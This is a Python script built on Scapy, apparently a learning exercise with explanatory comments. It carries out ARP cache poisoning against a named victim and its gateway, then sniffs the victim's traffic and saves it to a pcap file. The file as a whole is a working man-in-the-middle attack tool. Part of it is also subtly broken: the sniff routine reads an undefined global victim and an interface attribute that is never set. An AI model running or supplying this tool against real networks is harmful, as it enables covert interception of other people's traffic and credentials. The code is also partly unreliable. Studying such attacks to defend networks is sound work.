from multiprocessing import Process
from scapy.all import (ARP,Ether,conf,get_if_hwaddr,send,sniff,sndrcv,srp,wrpcap)  
import os
import sys
import time
def get_mac(targetip):
    packet=Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has",pdst=targetip) #creates layer 2 ethernet frame (Ether) and an ARP request dst="ff:....."->this is the broadcast mac address meaning the frame will be sent to all devices on the local network ARP(op="who-has",pdst=targetip)->this is the ARP request asking who has this(pdst(protocol destination)) IP address 
    #(answered,unanswered packets)
    resp,_=srp(packet,timeout=2,retry=10,verbose=False) #srp ->sends and recieves pakets at layer2(Ethernet) timeout waits for response of 2 seconds retries 10 times verbose=False means dont let Scapy print its things in your terminal
    for _,r in resp: #_ means we are ignoring the sent packet 
        return r[Ether].src
    return None
class Arper:
    def __init__(self,victim,gateway,interface='en0'):
        self.victim=victim
        self.victimmac=get_mac(victim)
        self.gateway=gateway
        self.gatewaymac=get_mac(gateway)
        conf.interface=interface
        conf.verb=0   #disables Scapy's automatic output/logging — like when it sends or receives packets.
        print(f'Initialized {interface}')
        print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)  
    def run(self):
        self.poison_thread=Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread=Process(target=self.sniff)
        self.sniff_thread.start()
    def poison(self):
        poison_victim=ARP()  #creates an ARP packet object using scapy's ARP class  
        poison_victim.op=2   #operation code of type of the ARP message 1-> who-has ARP Request(asking "Who has IP X?) 2->is-at ARP reply (saying "IP X is at MAC Y") 
        poison_victim.psrc=self.gateway #claim to this IP  IP address attacker pretending to be    
        poison_victim.pdst=self.victim  #Victim's IP
        poison_victim.hwdst=self.victimmac #Victim's MAC hardware destination
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')    #hwsrc ->attacker's MAC
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway=ARP()
        poison_gateway.op=2
        poison_gateway.psrc=self.victim
        poison_gateway.pdst=self.gateway
        poison_gateway.hwdst=self.gatewaymac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')    #mac address of gateway
        print(f'mac_src: {poison_gateway.hwsrc}')   #hwsrc-->attackers mac
        print(poison_gateway.summary())
        print('-'*30)
        print(f'Begining the ARP poison. [CTRL-C to stop]')
        while True:
            sys.stdout.write('.')  
            sys.stdout.flush()      #forces the Python program to immediately write whatever is in the stdout (standard output) buffer to the terminal or screen
            try:
                send(poison_victim) #send->Transmits a crafted packet (like an ARP reply) over the network.Works on Layer 3 by default — IP and above.
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            #You're continuously sending fake ARP replies to both the victim and the gateway every 2 seconds to keep poisoning their ARP caches. ARP tables can time out or get refreshed, so continuous poisoning is necessary to maintain control.    
            else:
                time.sleep(2)       
    def sniff(self,count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter="ip host %s" %victim
        packets=sniff(count=count,filter=bpf_filter,iface=self.interface)
        wrpcap('arper.pcap',packets) #Write captured packets to .pcap file
        print('Got Packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished..')    
    def restore(self):
        print('Restoring ARP tables')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
        count=5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
        count=5)
if __name__=='__main__':
    (victim,gateway,interface)=(sys.argv[1],sys.argv[2],sys.argv[3])
    myarp=Arper(victim,gateway,interface)
    myarp.run()
